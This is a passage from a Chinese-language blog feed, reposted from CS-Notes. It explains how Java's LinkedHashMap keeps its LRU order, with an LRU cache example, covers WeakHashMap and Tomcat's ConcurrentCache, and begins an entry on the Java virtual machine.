class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Map</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span></code></pre><p>内部维护了一个双向链表，用来维护插入顺序或者 LRU 顺序。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * The head (eldest) of the doubly linked list. */</span><span class="token keyword">transient</span> LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> head<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * The tail (youngest) of the doubly linked list. */</span><span class="token keyword">transient</span> LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> tail<span class="token punctuation">;</span></code></pre><p>accessOrder 决定了顺序，默认为 false，此时维护的是插入顺序。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> accessOrder<span class="token punctuation">;</span></code></pre><p>LinkedHashMap 最重要的是以下用于维护顺序的函数，它们会在 put、get 等方法中调用。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">afterNodeAccess</span><span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">afterNodeInsertion</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> evict<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span></code></pre><h3 id="afterNodeAccess"><a href="#afterNodeAccess" class="headerlink" title="afterNodeAccess()"></a>afterNodeAccess()</h3><p>当一个节点被访问时，如果 accessOrder 为 true，则会将该节点移到链表尾部。也就是说指定为 LRU 顺序之后，在每次访问一个节点时，会将这个节点移到链表尾部，保证链表尾部是最近访问的节点，那么链表首部就是最近最久未使用的节点。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">afterNodeAccess</span><span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// move node to last</span>    LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> last<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>accessOrder <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>last <span class="token operator">=</span> tail<span class="token punctuation">)</span> <span class="token operator">!=</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p <span class="token operator">=</span>            <span class="token punctuation">(</span>LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">)</span>e<span class="token punctuation">,</span> b <span class="token operator">=</span> p<span class="token punctuation">.</span>before<span class="token punctuation">,</span> a <span class="token operator">=</span> p<span class="token punctuation">.</span>after<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>after <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> null<span class="token punctuation">)</span>            head <span class="token operator">=</span> a<span class="token punctuation">;</span>        <span class="token keyword">else</span>            b<span class="token punctuation">.</span>after <span class="token operator">=</span> a<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> null<span class="token punctuation">)</span>            a<span class="token punctuation">.</span>before <span class="token operator">=</span> b<span class="token punctuation">;</span>        <span class="token keyword">else</span>            last <span class="token operator">=</span> b<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">==</span> null<span class="token punctuation">)</span>            head <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            p<span class="token punctuation">.</span>before <span class="token operator">=</span> last<span class="token punctuation">;</span>            last<span class="token punctuation">.</span>after <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tail <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token operator">++</span>modCount<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="afterNodeInsertion"><a href="#afterNodeInsertion" class="headerlink" title="afterNodeInsertion()"></a>afterNodeInsertion()</h3><p>在 put 等操作之后执行，当 removeEldestEntry() 方法返回 true 时会移除最晚的节点，也就是链表首部节点 first。</p><p>evict 只有在构建 Map 的时候才为 false，在这里为 true。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">afterNodeInsertion</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> evict<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// possibly remove eldest</span>    LinkedHashMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> first<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>evict <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>first <span class="token operator">=</span> head<span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token function">removeEldestEntry</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        K key <span class="token operator">=</span> first<span class="token punctuation">.</span>key<span class="token punctuation">;</span>        <span class="token function">removeNode</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>removeEldestEntry() 默认为 false，如果需要让它为 true，需要继承 LinkedHashMap 并且覆盖这个方法的实现，这在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">removeEldestEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> eldest<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="LRU-缓存"><a href="#LRU-缓存" class="headerlink" title="LRU 缓存"></a>LRU 缓存</h3><p>以下是使用 LinkedHashMap 实现的一个 LRU 缓存：</p><ul><li>设定最大缓存空间 MAX_ENTRIES 为 3；</li><li>使用 LinkedHashMap 的构造函数将 accessOrder 设置为 true，开启 LRU 顺序；</li><li>覆盖 removeEldestEntry() 方法实现，在节点多于 MAX_ENTRIES 就会将最近最久未使用的数据移除。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">LRUCache</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX_ENTRIES <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">removeEldestEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry eldest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> MAX_ENTRIES<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">LRUCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>MAX_ENTRIES<span class="token punctuation">,</span> <span class="token number">0.75f</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    LRUCache<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LRUCache</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cache<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span></code></pre><h2 id="WeakHashMap"><a href="#WeakHashMap" class="headerlink" title="WeakHashMap"></a>WeakHashMap</h2><h3 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h3><p>WeakHashMap 的 Entry 继承自 WeakReference，被 WeakReference 关联的对象在下一次垃圾回收时会被回收。</p><p>WeakHashMap 主要用来实现缓存，通过使用 WeakHashMap 来引用缓存对象，由 JVM 对这部分缓存进行回收。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">WeakReference</span><span class="token operator">&lt;</span>Object<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span></code></pre><h3 id="ConcurrentCache"><a href="#ConcurrentCache" class="headerlink" title="ConcurrentCache"></a>ConcurrentCache</h3><p>Tomcat 中的 ConcurrentCache 使用了 WeakHashMap 来实现缓存功能。</p><p>ConcurrentCache 采取的是分代缓存：</p><ul><li>经常使用的对象放入 eden 中，eden 使用 ConcurrentHashMap 实现，不用担心会被回收（伊甸园）；</li><li>不常用的对象放入 longterm，longterm 使用 WeakHashMap 实现，这些老对象会被垃圾收集器回收。</li><li>当调用 get() 方法时，会先从 eden 区获取，如果没有找到的话再到 longterm 获取，当从 longterm 获取到就把对象放入 eden 中，从而保证经常被访问的节点不容易被回收。</li><li>当调用 put() 方法时，如果 eden 的大小超过了 size，那么就将 eden 中的所有对象都放入 longterm 中，利用虚拟机回收掉一部分不经常使用的对象。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">ConcurrentCache</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Map<span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> eden<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Map<span class="token operator">&lt;</span>K<span class="token punctuation">,</span> V<span class="token operator">></span> longterm<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcurrentCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>eden <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>longterm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> V <span class="token function">get</span><span class="token punctuation">(</span>K k<span class="token punctuation">)</span> <span class="token punctuation">{</span>        V v <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            v <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>longterm<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">!=</span> null<span class="token punctuation">)</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> v<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span>K k<span class="token punctuation">,</span> V v<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>longterm<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>eden<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>Collection 绘图源码：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span><span class="token keyword">interface</span> <span class="token class-name">Collection</span><span class="token keyword">interface</span> <span class="token class-name">Set</span><span class="token keyword">interface</span> <span class="token class-name">List</span><span class="token keyword">interface</span> <span class="token class-name">Queue</span><span class="token keyword">interface</span> <span class="token class-name">SortSet</span><span class="token keyword">class</span> <span class="token class-name">HashSet</span><span class="token keyword">class</span> <span class="token class-name">LinkedHashSet</span><span class="token keyword">class</span> <span class="token class-name">TreeSet</span><span class="token keyword">class</span> <span class="token class-name">ArrayList</span><span class="token keyword">class</span> <span class="token class-name">Vector</span><span class="token keyword">class</span> <span class="token class-name">LinkedList</span><span class="token keyword">class</span> <span class="token class-name">PriorityQueue</span>Collection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> SetCollection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> ListCollection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> QueueSet <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> SortSetSet <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> HashSetSet <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> LinkedHashSetSortSet <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> TreeSetList <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ArrayListList <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> VectorList <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> LinkedListQueue <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> LinkedListQueue <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> PriorityQueue<span class="token annotation punctuation">@enduml</span></code></pre><p>Map 绘图源码</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span><span class="token keyword">interface</span> <span class="token class-name">Map</span><span class="token keyword">interface</span> <span class="token class-name">SortMap</span><span class="token keyword">class</span> <span class="token class-name">HashTable</span><span class="token keyword">class</span> <span class="token class-name">LinkedHashMap</span><span class="token keyword">class</span> <span class="token class-name">HashMap</span><span class="token keyword">class</span> <span class="token class-name">TreeMap</span>Map <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> HashTableMap <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> LinkedHashMapMap <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> HashMapMap <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> SortMapSortMap <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> TreeMap<span class="token annotation punctuation">@enduml</span></code></pre><p>迭代器类图</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span><span class="token keyword">interface</span> <span class="token class-name">Iterable</span><span class="token keyword">interface</span> <span class="token class-name">Collection</span><span class="token keyword">interface</span> <span class="token class-name">List</span><span class="token keyword">interface</span> <span class="token class-name">Set</span><span class="token keyword">interface</span> <span class="token class-name">Queue</span><span class="token keyword">interface</span> <span class="token class-name">Iterator</span><span class="token keyword">interface</span> <span class="token class-name">ListIterator</span>Iterable <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> CollectionCollection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ListCollection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> SetCollection <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token operator">--</span> QueueIterator <span class="token operator">&lt;</span><span class="token operator">--</span> IterableIterator <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ListIteratorListIterator <span class="token operator">&lt;</span><span class="token operator">--</span> List<span class="token annotation punctuation">@enduml</span></code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Eckel B. Java 编程思想 [M]. 机械工业出版社, 2002.</li><li><a href="https://www.w3resource.com/java-tutorial/java-collections.php" target="_blank" rel="noopener">Java Collection Framework</a></li><li><a href="https://openhome.cc/Gossip/DesignPattern/IteratorPattern.htm" target="_blank" rel="noopener">Iterator 模式</a></li><li><a href="https://tech.meituan.com/java_hashmap.html" target="_blank" rel="noopener">Java 8 系列之重新认识 HashMap</a></li><li><a href="http://javarevisited.blogspot.hk/2010/10/difference-between-hashmap-and.html" target="_blank" rel="noopener">What is difference between HashMap and Hashtable in Java?</a></li><li><a href="http://www.zhangchangle.com/2018/02/07/Java%E9%9B%86%E5%90%88%E4%B9%8BHashMap/" target="_blank" rel="noopener">Java 集合之 HashMap</a></li><li><a href="http://www.programering.com/a/MDO3QDNwATM.html" target="_blank" rel="noopener">The principle of ConcurrentHashMap analysis</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/java-lo-concurrenthashmap/" target="_blank" rel="noopener">探索 ConcurrentHashMap 高并发性的实现机制</a></li><li><a href="https://www.jianshu.com/p/75adf47958a7" target="_blank" rel="noopener">HashMap 相关面试题及其解答</a></li><li><a href="http://wiki.jikexueyuan.com/project/java-enhancement/java-thirtysix.html" target="_blank" rel="noopener">Java 集合细节（二）：asList 的缺陷</a></li><li><a href="http://javaconceptoftheday.com/java-collection-framework-linkedlist-class/" target="_blank" rel="noopener">Java Collection Framework – The LinkedList Class</a></li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java虚拟机</title>
      <link href="/2018/12/24/java/java-xu-ni-ji/java-xu-ni-ji/"/>
      <url>/2018/12/24/java/java-xu-ni-ji/java-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="Java虚拟机"><a href="#Java虚拟机" class="headerlink" title="Java虚拟机"></a>Java虚拟机</h2><ul><li>一、运行时数据区域<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%A8%8B%E5%BA%8F%E8%AE%A1%E6%95%B0%E5%99%A8">程序计数器</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88">Java 虚拟机栈</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E6%9C%AC%E5%9C%B0%E6%96%B9%E6%B3%95%E6%A0%88">本地方法栈</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%A0%86">堆</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E6%96%B9%E6%B3%95%E5%8C%BA">方法区</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E8%BF%90%E8%A1%8C%E6%97%B6%E5%B8%B8%E9%87%8F%E6%B1%A0">运行时常量池</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%9B%B4%E6%8E%A5%E5%86%85%E5%AD%98">直接内存</a></li></ul></li><li>二、垃圾收集<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A2%AB%E5%9B%9E%E6%94%B6">判断一个对象是否可被回收</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B">引用类型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95">垃圾收集算法</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8">垃圾收集器</a></li></ul></li><li>三、内存分配与回收策略<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#minor-gc-%E5%92%8C-full-gc">Minor GC 和 Full GC</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5">内存分配策略</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#full-gc-%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6">Full GC 的触发条件</a></li></ul></li><li>四、类加载机制<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%B1%BB%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">类的生命周期</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B">类加载过程</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E6%97%B6%E6%9C%BA">类初始化时机</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%B1%BB%E4%B8%8E%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8">类与类加载器</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%B1%BB">类加载器分类</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">双亲委派模型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0">自定义类加载器实现</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、运行时数据区域"><a href="#一、运行时数据区域" class="headerlink" title="一、运行时数据区域"></a>一、运行时数据区域</h1><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/83e9c5ed-35a1-41fd-b0dd-ce571969b5f3_200.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/83e9c5ed-35a1-41fd-b0dd-ce571969b5f3_200.png" alt="img"></a></p><h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。</p><h2 id="Java-虚拟机栈"><a href="#Java-虚拟机栈" class="headerlink" title="Java 虚拟机栈"></a>Java 虚拟机栈</h2><p>每个 